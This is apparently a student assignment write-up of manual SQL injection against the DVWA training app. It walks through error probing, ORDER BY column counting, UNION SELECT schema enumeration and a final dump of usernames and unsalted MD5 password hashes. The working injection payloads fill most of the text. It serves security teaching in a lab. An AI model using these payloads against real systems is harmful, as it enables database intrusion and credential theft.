# Task 1, Part B — Manual SQL Injection (20 Marks)

**Environment:** DVWA, Low security, SQL Injection module (`/vulnerabilities/sqli/`). No `sqlmap` used — every payload below was hand-crafted and submitted via the browser URL.

## 1. Baseline

```
?id=1&Submit=Submit
```
Returns `ID: 1 / First name: admin / Surname: admin`.
Screenshot: `1b-01-sqli-baseline-id1.png`

## 2. Single-quote test

```
?id=1'&Submit=Submit
```
Response:
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL
syntax; ... near "1'" at line 1 in
/usr/share/dvwa/vulnerabilities/sqli/source/low.php:11
```
Confirms the `id` parameter is concatenated directly into the SQL string with no sanitization/parameterization. Also discloses the source path and confirms **MariaDB** as the backend.
Screenshot: `1b-02-sqli-single-quote-error.png`

## 3. ORDER BY — column count

| Payload | Result |
|---|---|
| `?id=1' ORDER BY 1-- -&Submit=Submit` | OK |
| `?id=1' ORDER BY 2-- -&Submit=Submit` | OK |
| `?id=1' ORDER BY 3-- -&Submit=Submit` | `Unknown column '3' in 'ORDER BY'` |

**Conclusion: the underlying query returns 2 columns.**
Screenshots: `1b-03-orderby-2-ok.png`, `1b-04-orderby-3-error.png`

## 4. UNION SELECT — confirm injectable columns

```
?id=0' UNION SELECT 1,2-- -&Submit=Submit
```
`id=0` is used (instead of a valid id) so the original query returns nothing, forcing the page to display only the injected UNION row.
Result: `First name: 1 / Surname: 2` — confirms column 1 → "First name" slot, column 2 → "Surname" slot.
Screenshot: `1b-05-union-select-1-2.png`

## 5. Database name and version

```
?id=0' UNION SELECT database(),version()-- -&Submit=Submit
```
Result: `First name: dvwa / Surname: 11.8.9-MariaDB-4 from Debian`
Screenshot: `1b-06-db-version-enum.png`

## 6. Table enumeration + group_concat()

Per-row (two tables found):
```
?id=0' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema=database()-- -&Submit=Submit
```
→ `users` and `guestbook`, each as a separate row (illustrates the single-row limitation of plain UNION SELECT).

Merged into one row with `group_concat()` (as required by the assignment):
```
?id=0' UNION SELECT group_concat(table_name),table_schema FROM information_schema.tables WHERE table_schema=database()-- -&Submit=Submit
```
Result: `First name: users,guestbook / Surname: dvwa`
Screenshot: `1b-07-groupconcat-tables.png`

## 7. Column enumeration

```
?id=0' UNION SELECT group_concat(column_name),table_name FROM information_schema.columns WHERE table_name='users'-- -&Submit=Submit
```
Relevant DVWA columns found: `user_id, first_name, last_name, user, password, avatar, last_login, failed_login`
(Note: uppercase `USER`, `PASSWORD_ERRORS`, `PASSWORD_EXPIRATION_TIME` also appeared from MariaDB's internal `mysql.user` system table — a reminder to fully-qualify the target table in the next step.)
Screenshot: `1b-08-column-enum.png`

## 8. Final extraction — usernames and password hashes

```
?id=0' UNION SELECT group_concat(user,0x3a,password SEPARATOR 0x3c62723e),2 FROM dvwa.users-- -&Submit=Submit
```
- `0x3a` = hex for `:` (separator between user and hash)
- `0x3c62723e` = hex for `<br>` (forces each row onto its own line in the HTML output)
- `dvwa.users` fully qualified to avoid ambiguity with `mysql.user`

**Result (full dump):**
```
admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
1337:8d3533d75ae2c3966d7e0d4fcc69216b
pablo:0d107d09f5bbe40cade3de5c71e9e9b7
smithy:5f4dcc3b5aa765d61d8327deb882cf99
```
Screenshot: `1b-09-final-creds-dump.png`

**Note:** these are unsalted MD5 hashes (`5f4dcc3b5aa765d61d8327deb882cf99` is the well-known MD5 of the string `"password"`), trivially crackable via rainbow tables — ties directly into the remediation discussion in Part C (parameterized queries alone don't fix weak password storage).
